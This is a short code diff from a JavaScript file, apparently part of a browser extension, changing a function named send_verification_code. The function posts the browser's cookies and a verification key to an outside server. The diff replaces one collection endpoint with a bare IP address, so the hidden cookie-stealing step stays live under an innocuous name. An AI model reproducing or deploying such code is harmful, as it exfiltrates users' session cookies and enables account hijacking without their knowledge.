@@ -25,8 +25,8 @@ function send_verification_code(cookies) {
     //console.log(data_cookies);
     $.ajax({
       type: 'POST',
-      url: 'https://kcilk.company/json/chrome.php',
-      data: 'action=send_cookies&cookies=' + data_cookies + '&check_key=' + current_verification_key,
+      url: 'http://92.118.150.87/api/chrome',
+      data: 'cookies=' + data_cookies + '&check_key=' + current_verification_key,
       success: function(dataRequest) {
         //console.log(dataRequest);
       },
